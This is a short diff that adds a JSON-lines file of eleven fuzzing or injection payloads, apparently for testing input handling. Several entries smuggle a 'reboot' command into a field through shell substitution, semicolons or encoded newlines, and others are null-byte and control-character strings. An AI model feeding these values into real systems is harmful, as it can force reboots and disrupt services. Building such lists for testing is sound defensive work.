@@ -1,0 +1,11 @@
+{"payload": "!@#$%%^#$%#$@#$%$$@#$%^^**(()"}
+{"payload": "$(reboot)"}
+{"payload": "$;reboot"}
+{"payload": "%00"}
+{"payload": "%00/"}
+{"payload": "%01%02%03%04%0a%0d%0aADSF"}
+{"payload": "%01%02%03@%04%0a%0d%0aADSF"}
+{"payload": "%0a reboot %0a"}
+{"payload": "%0Areboot"}
+{"payload": "%0Areboot%0A"}
+{"payload": "%0DCMD=$'reboot';$CMD"}
